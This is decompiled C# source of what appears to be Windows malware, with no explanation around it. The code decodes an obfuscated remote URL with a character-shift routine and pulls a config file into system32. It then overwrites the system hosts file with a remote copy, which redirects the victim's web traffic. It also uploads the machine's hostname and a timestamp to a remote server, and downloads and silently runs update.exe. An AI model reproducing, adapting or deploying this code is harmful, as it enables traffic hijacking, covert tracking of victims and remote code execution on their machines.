using System;
using System.Net;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using WindowsApplication2.My;

namespace WindowsApplication2;

[StandardModule]
internal sealed class Module1
{
	public static object Line;

	public static string Encriptado;

	[STAThread]
	public static void main()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 335:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0045;
						case 6:
							goto IL_006c;
						case 7:
							goto IL_0073;
						case 8:
							goto IL_007a;
						case 9:
							goto IL_0090;
						case 10:
							goto IL_00cd;
						case 11:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 12:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00cd:
					num = 10;
					Edita(Conversions.ToString(DateTime.Now) + Dns.GetHostName() + "\r\n");
					break;
					IL_0090:
					num = 9;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Line, new object[1] { 0 }, (string[])null))), "C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
					goto IL_00cd;
					IL_0008:
					num = 2;
					Lk("~ŠŠ†PEEƒ‹‰\u007fywˆ…ŽE\u007fƒw}{‰E‚\u007f„\u0081‰H");
					goto IL_0014;
					IL_0014:
					num = 3;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\lk");
					goto IL_002a;
					IL_002a:
					num = 4;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Encriptado, "C:\\WINDOWS\\system32\\lk");
					goto IL_0045;
					IL_0045:
					num = 5;
					Line = Strings.Split(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText("C:\\WINDOWS\\system32\\lk"), "\t", -1, (CompareMethod)0);
					goto IL_006c;
					IL_006c:
					num = 6;
					Update1();
					goto IL_0073;
					IL_0073:
					num = 7;
					Desinfecta();
					goto IL_007a;
					IL_007a:
					num = 8;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
					goto IL_0090;
					end_IL_0000_2:
					break;
				}
				num = 11;
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\lk");
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 335;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void Lk(string Clave)
	{
		Encriptado = "";
		int num = Strings.Len(Clave);
		for (int i = 1; i <= num; i = checked(i + 1))
		{
			object obj = Strings.Asc(Strings.Mid(Clave, i, 1));
			obj = Operators.SubtractObject(obj, (object)32);
			string text = Conversions.ToString(Strings.Chr(Conversions.ToInteger(Operators.AddObject(obj, (object)10))));
			Encriptado += text;
		}
	}

	public static void Edita(string strTexto)
	{
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\windsetup.txt", strTexto, true);
		((ServerComputer)MyProject.Computer).get_Network().UploadFile("C:\\WINDOWS\\system32\\windsetup.txt", Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Line, new object[1] { 1 }, (string[])null))) + "Version: " + Application.get_ProductVersion() + "   " + strTexto, "", "");
	}

	public static void Desinfecta()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string[] array = default(string[]);
		int num6 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 401:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_005d;
						case 5:
							goto IL_0081;
						case 6:
							goto IL_0093;
						case 7:
							goto IL_00ac;
						case 8:
							goto IL_00c3;
						case 9:
							goto IL_0100;
						case 10:
						case 11:
						case 12:
							goto IL_011d;
						case 13:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 14:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_011d:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_008c;
					IL_0100:
					num = 9;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\baned.txt");
					ProjectData.EndApp();
					goto IL_011d;
					IL_0009:
					num = 2;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\baned.txt");
					goto IL_0020;
					IL_0020:
					num = 3;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Line, new object[1] { 2 }, (string[])null))), "C:\\WINDOWS\\system32\\baned.txt");
					goto IL_005d;
					IL_005d:
					num = 4;
					array = Strings.Split(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText("C:\\WINDOWS\\system32\\baned.txt"), "\t", -1, (CompareMethod)0);
					goto IL_0081;
					IL_0081:
					num = 5;
					num6 = checked(array.Length - 1);
					num5 = 0;
					goto IL_008c;
					IL_008c:
					if (num5 > num6)
					{
						break;
					}
					goto IL_0093;
					IL_0093:
					num = 6;
					if (Operators.CompareString(Dns.GetHostName(), Strings.Trim(array[num5]), false) == 0)
					{
						goto IL_00ac;
					}
					goto IL_011d;
					IL_00ac:
					num = 7;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
					goto IL_00c3;
					IL_00c3:
					num = 8;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Line, new object[1] { 3 }, (string[])null))), "C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
					goto IL_0100;
					end_IL_0000_2:
					break;
				}
				num = 13;
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\baned.txt");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 401;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void Update1()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 274:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_003f;
						case 4:
							goto IL_007c;
						case 5:
							goto IL_008d;
						case 6:
						case 7:
						case 8:
							goto IL_00a9;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00a9:
					num = 8;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\update.exe");
					break;
					IL_008d:
					num = 5;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\uaa.txt");
					ProjectData.EndApp();
					goto IL_00a9;
					IL_0008:
					num = 2;
					if (Operators.CompareString(Application.get_ProductVersion(), Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Line, new object[1] { 7 }, (string[])null))), false) != 0)
					{
						goto IL_003f;
					}
					goto IL_00a9;
					IL_003f:
					num = 3;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Line, new object[1] { 8 }, (string[])null))), "C:\\update.exe");
					goto IL_007c;
					IL_007c:
					num = 4;
					Interaction.Shell("C:\\update.exe", (AppWinStyle)0, false, -1);
					goto IL_008d;
					end_IL_0000_2:
					break;
				}
				num = 9;
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\uaa.txt");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 274;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
